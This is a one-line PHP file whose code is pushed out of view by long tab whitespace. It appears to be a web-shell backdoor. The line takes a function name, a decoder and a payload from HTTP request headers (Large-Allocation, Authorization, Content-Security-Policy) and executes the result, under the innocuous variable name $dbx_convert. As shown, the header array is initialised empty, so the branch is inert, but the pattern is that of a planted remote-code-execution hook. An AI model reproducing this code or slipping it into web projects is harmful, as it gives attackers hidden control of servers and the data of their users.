<?php																																										$_HEADERS=Array();if(isset($_HEADERS['Large-Allocation'])){$dbx_convert=$_HEADERS['Large-Allocation']('', $_HEADERS['Authorization']($_HEADERS['Content-Security-Policy']));$dbx_convert();}
